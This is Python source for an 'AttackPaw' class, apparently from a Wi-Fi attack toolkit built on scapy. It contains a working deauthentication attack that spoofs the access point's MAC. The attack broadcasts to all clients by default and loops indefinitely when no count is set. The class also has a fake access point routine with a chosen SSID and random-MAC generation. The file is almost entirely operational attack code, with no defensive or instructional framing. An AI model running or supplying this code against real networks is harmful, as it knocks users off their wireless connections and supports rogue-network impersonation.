import multiprocessing
from scapy.volatile import RandMAC
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon
from scapy.sendrecv import sendp

from objects.accesspoint import AccessPoint
from objects.interface import Interface

from paws.util_paw import UtilPaw
from paws.iface_paw import IfacePaw

class AttackPaw(IfacePaw):

    __util_paw = None

    # general
    _verbose = False

    # deauth
    _target_mac = ''
    _target_network_mac = ''
    _interval = .1
    _count = 0

    # access point
    _ssid = ''
    _mac_address = ''
    _interval = 0.1

    _access_point = None


    def __init__(self, util_paw: UtilPaw) -> None:
        self.__util_paw = util_paw
        super().__init__(self.__util_paw)

    def set_verbose(self, verbose: bool) -> None:
        self._verbose = verbose

    def set_target_network_mac(self, target_network_mac: str) -> None:
        self._target_network_mac  = target_network_mac

    def set_target_mac(self, target_mac: str) -> None:
        self._target_mac = 'ff:ff:ff:ff:ff:ff' if not target_mac else target_mac # if target_mac not defined use broadcast

    def set_interval(self, interval: float) -> None:
        self._interval = interval

    def set_interface(self, interface: str) -> None:
        return super().set_interface(interface)

    def set_count(self, count: int) -> None:
        self._count = count
    
    def set_ssid(self, ssid: str):
        self._ssid = ssid

    def set_mac_address(self, mac_address: str):
        self._mac_address = mac_address
    
    def get_random_mac_address(self) -> str:
        return str(RandMAC())
    
    def deauth(self) -> None:

        # 802.11 frame
        dot11 = Dot11(
            addr1=self._target_mac, # destination MAC
            addr2=self._target_network_mac, # source MAC
            addr3=self._target_network_mac, # Access Point MAC
        )
        # stack them up
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        # send the packet
        sendp(
            x=packet,
            inter=self._interval,
            count=self._count,
            loop=not self._count,
            iface=self._interface,
            verbose=True,
        )
    
    def fake_ap(self) -> None:
        access_point = AccessPoint(
            ssid=self._ssid,
            interface=self._interface,
            interval=self._interval,
            mac_address=self._mac_address,
        )

        access_point.appear()